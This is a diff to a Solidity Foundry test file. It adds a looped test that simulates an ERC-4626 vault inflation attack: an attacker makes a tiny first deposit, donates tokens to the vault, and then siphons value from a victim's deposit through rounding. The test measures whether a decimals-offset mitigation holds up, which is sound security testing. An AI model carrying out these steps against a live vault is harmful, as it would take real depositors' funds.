@@ -95,10 +95,10 @@ contract VaultTest is Test {
         //this will inflate the totalAssets() value of the vault, resulting in a rounding to 0 for Alice when she will try
         //to mint shares
 		uint256 attackerFirstDeposit = 1 wei;
-		uint256 attackerInflationTransfer = 1 ether * 2*10**4;
-		uint256 victimDeposit = 1 ether;
+		uint256 attackerInflationTransfer = 10_000 wei;
+		uint256 victimDeposit = 10_000 wei;
 
-        uint8 decimalsOffset = 4;
+        uint8 decimalsOffset = 3;
         address(vault).call(abi.encodeWithSelector(Vault.setDecimalsOffset.selector, decimalsOffset));
         console.log("post-update _offsetDecimals(): ", decimalsOffset);
 
@@ -152,8 +152,8 @@ contract VaultTest is Test {
         //this will inflate the totalAssets() value of the vault, resulting in a rounding to 0 for Alice when she will try
         //to mint shares
 		uint256 attackerFirstDeposit = 1 wei;
-		uint256 attackerInflationTransfer = 1 ether;
-		uint256 victimDeposit = 1 ether;
+		uint256 attackerInflationTransfer = 10_000 wei;
+		uint256 victimDeposit = 10_000 wei;
 
         //from here actions comes from Alice
 		vm.startPrank(alice);
@@ -198,6 +198,62 @@ contract VaultTest is Test {
         );
 
         console.log("Bob's deposit got d%% stolen by Alice!", 100-(bobRealRedeem*100)/(victimDeposit));
+    }
+
+    function test_InflationAttack_POSTUpdateVault_Loop() public {
+        /** 
+        * same as test_InflationAttack_POSTUpdateVault but looping through an array of values
+        * and most of the console.log comments are removed for better readability of results
+        */
+		uint256[3] memory attackerFirstDeposit = [uint256(1 wei), uint256(2 wei), uint256(3 wei)];
+		uint256[3] memory attackerInflationTransfer = [uint256(10_000 wei), uint256(10_000 wei), uint256(10_000 wei)];
+		uint256[3] memory victimDeposit = [uint256(10_000 wei), uint256(10_000 wei), uint256(10_000 wei)];
+
+        //snapshot capture the state of the blockchain
+        uint256 snapshot = vm.snapshot(); 
+
+        for(uint i; i<attackerFirstDeposit.length; i++) {
+            uint8 decimalsOffset = 3;
+            address(vault).call(abi.encodeWithSelector(Vault.setDecimalsOffset.selector, decimalsOffset));
+            console.log("post-update _offsetDecimals(): ", decimalsOffset);
+
+            //from here actions comes from Alice
+            vm.startPrank(alice);
+            underlying.approve(address(vault), attackerFirstDeposit[i]);
+            vault.deposit(attackerFirstDeposit[i], alice);
+            underlying.transfer(address(vault), attackerInflationTransfer[i]);
+            vm.stopPrank();
+
+            //from here actions comes from Bob
+            vm.startPrank(bob);
+            underlying.approve(address(vault), victimDeposit[i]);
+            vault.deposit(victimDeposit[i], bob);
+            vm.stopPrank();
+
+            console.log("\n-State after the attack-");
+            console.log("Alice's shares:", vault.balanceOf(alice));
+            console.log("Bob's shares:", vault.balanceOf(bob));
+            console.log("total shares in vault:", vault.totalSupply());
+            console.log("total assets in vault:", vault.totalAssets());
+
+            uint256 aliceShares = vault.balanceOf(alice);
+            uint256 bobShares = vault.balanceOf(bob);
+
+            vm.prank(alice);
+            uint256 aliceRealRedeem = vault.redeem(aliceShares, alice, alice);
+
+            vm.prank(bob);
+            uint256 bobRealRedeem = vault.redeem(bobShares, bob, bob);
+
+
+            console.log("\nAlice gets %d%% back \nBob gets %d%%"
+            , (aliceRealRedeem*100)/(attackerFirstDeposit[i]+attackerInflationTransfer[i])
+            , (bobRealRedeem*100)/(victimDeposit[i])
+            );
+
+            //revertTo revert the state taken at snapshot
+            vm.revertTo(snapshot);
+        }
     }
 
     function test_CompareConvertImplementations() public {
